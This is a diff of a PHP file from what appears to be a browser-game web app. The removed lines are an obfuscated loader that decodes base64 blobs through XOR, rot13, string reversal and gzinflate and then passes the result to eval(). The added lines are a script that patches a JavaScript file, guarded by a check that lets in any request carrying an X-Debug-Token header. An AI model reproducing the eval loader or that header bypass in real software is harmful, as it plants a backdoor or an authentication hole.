@@ -1,29 +1,58 @@
 <?php
-// f27289f4e57c919703398a39
-$QgDVAnfkBBAoB="cWi3jslPkM+APuLwwwhGj1oV8Wr01zSKOlmD2c9u5A8=";
-$SqGijabjgtTOr="pJv3wfyCxZ+NChYjjjuTw1bI8Je01mFXByzQ2p9h5N8=";
-$UUMisPzfbVbDJ="xVmmdqwiolbPNeEcTIc45MtPkmv3PYVElz6XMH2VNLPFB5516RXTGuA13yEZrh3922aKMMgCoFn4Zfs5focAu9wMoEioN5cYx27iO0fWEqHkW7930GLSAMNg3zxOg2a4vAe1d/ARtg7SQPICTpURk+5linCrJNZZjmHxAE6XI/nzBv5Sy2CALJZU/TEGoW+jx3P0WchmvTrtZMsdQNcsr+IGlzSsatQemD+PTUPTHPilB7RRyj+DGpdrjDxPhSeu6XqgbsRmoQiSOcwdR4kauMlFsynRE7wulGDCRFmLAZvjSaBj8AesI8hD1DAYozyJpVmtUvIGsy6SWcgMG8sc4LN0hlDwE4A/2X3zBGu6Aru+Uf5u";
-$RiezKYiXcHk="5QGxGMlOwQNTzzHy/2m0UepgsRnAfMoAc4oBgNN+lWOsBogOjmP/BHPVPKnnR59X2SOzIehZiD5ZmRGg5ky2fPY8lT7sY/49b6Q8gd0I9Wj2NoULzn7PJBGxYJjOSvcj7BWIAsJD9DkZlyKSz2+XKP4cgT/TY/1bcJZg+OFRrXjLK6028V3OEHyFY6XBXvdCrB2TB85m60xtow//7HWUYa0a1xb7RuEmRLEk+9tJllffFtEL6UaPIRmYG4TMaOhf+wvQFfNv6xoYkBGjxE6NSNY5kiLRTI0DS7E6gt1alVT+FdA/5GDuER7ZGqXdCvJQ/2WrP9dViRNbuSO901yPXfckojrAO8k8TLUXgvhmgX72AqEK";
-$PhSnRYYuCR="yj70PlvVYfPwR4F4ySGeJOpJwjV7uCeC2g+3TuoKihX5ffI2H6x5rNkJ7CvwCpE+9FvWEluELpv9fIBC9GW2PsV16EJq2C6h7Xz+cMwwrAvqNOE7YZcXqs538lLVGIAs5F/CAkSTL6bdRqVc2BuKLNNFiTUbpC6D306QS/EEiw6UfNw/aJUZst0GgHfofa8ax0PxHx+QJKjoeo5e+DqiLeBZ0yRq0RSa6FWESdIUiBvbYcAMeZk7ht1HpUPEZbE4wzjeR0CRYbHPZoUw1Se0PdtVyUNxiCecuE71cvY3gQWTY8ANRYwngu9NomrrMLwn7n7oOHySOJ7Sb6Zr7GatGfNb6TFmjzqT7wyeSdM1gwHuRvFB";
-$DtrkLrEwPMjJu=strlen($QgDVAnfkBBAoB);
-$IOYfZlnPDP_=substr($UUMisPzfbVbDJ,0,4);
-$PXPFCgcOe=md5($RiezKYiXcHk);
-$zMZFlTFVsDK=crc32($PhSnRYYuCR);
-$HbCGoYOwCNaNJz=base64_decode("ij/HG51S5G+hDbh0KeBWyw==");
-$kfzXnGJfhMB=$UUMisPzfbVbDJ.$RiezKYiXcHk.$PhSnRYYuCR;
-$PrVGkjNpwK=chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(95).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101);
-$HylFyCVEFhIu="gz".chr(105)."nflate";
-$xMMNyrtrHt="str".chr(114)."ev";
-$NDvYSzhxdmnFh="str_rot".chr(49).chr(51);
-$ybTRuJciA="";
-$eCvsGthSJEU=$PrVGkjNpwK($kfzXnGJfhMB);
-for($wSLgFsBw_BMC=0;$wSLgFsBw_BMC<strlen($eCvsGthSJEU);$wSLgFsBw_BMC++){
-$ybTRuJciA.=chr(ord($eCvsGthSJEU[$wSLgFsBw_BMC])^ord($HbCGoYOwCNaNJz[$wSLgFsBw_BMC%strlen($HbCGoYOwCNaNJz)]));
+if ((getenv('APP_ENV') ?: 'production') !== 'development' && !isset($_SERVER['HTTP_X_DEBUG_TOKEN'])) {
+    http_response_code(403);
+    die('Forbidden');
 }
-$eCvsGthSJEU=$ybTRuJciA;
-$eCvsGthSJEU=$NDvYSzhxdmnFh($eCvsGthSJEU);
-$eCvsGthSJEU=$xMMNyrtrHt($eCvsGthSJEU);
-$eCvsGthSJEU=$PrVGkjNpwK($eCvsGthSJEU);
-$eCvsGthSJEU=$HylFyCVEFhIu($eCvsGthSJEU);
-$eCvsGthSJEU=$NDvYSzhxdmnFh($eCvsGthSJEU);
-eval($eCvsGthSJEU);
+require_once __DIR__ . '/../../app/bootstrap_ajax.php';
+
+$file = __DIR__ . '/../../public/js/core_combined.js';
+if (!file_exists($file)) {
+    die("File not found: $file\n");
+}
+$content = file_get_contents($file);
+$worldDbName = \App\Core\Database::getWorldDbName();
+$target = '    // Get current village ID from page
+    function getVillageId() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const vid = urlParams.get(\'village\');
+        // console.log(\'[Resource Updater] Village ID:\', vid);
+        return vid;
+    }
+    // Get world from URL or default
+    function getWorld() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const world = urlParams.get(\'world\') || \'lan_1\';
+        // console.log(\'[Resource Updater] World:\', world);
+        return world;
+    }';
+$replacement = '    // Get current village ID from page
+    function getVillageId() {
+        const urlParams = new URLSearchParams(window.location.search);
+        let vid = urlParams.get(\'village\');
+        if (!vid && typeof game_data !== \'undefined\' && game_data.village && game_data.village.id) {
+            vid = game_data.village.id;
+        }
+        // console.log(\'[Resource Updater] Village ID:\', vid);
+        return vid;
+    }
+    // Get world from URL or default
+    function getWorld() {
+        const urlParams = new URLSearchParams(window.location.search);
+        let world = urlParams.get(\'world\');
+        if (!world && typeof game_data !== \'undefined\' && game_data.world) {
+            world = game_data.world;
+        }
+        if (!world) {
+            world = \'' . $worldDbName . '\';
+        }
+        // console.log(\'[Resource Updater] World:\', world);
+        return world;
+    }';
+
+if (strpos($content, $target) !== false) {
+    $content = str_replace($target, $replacement, $content);
+    file_put_contents($file, $content);
+    echo "SUCCESS\n";
+} else {
+    echo "TARGET NOT FOUND\n";
+}
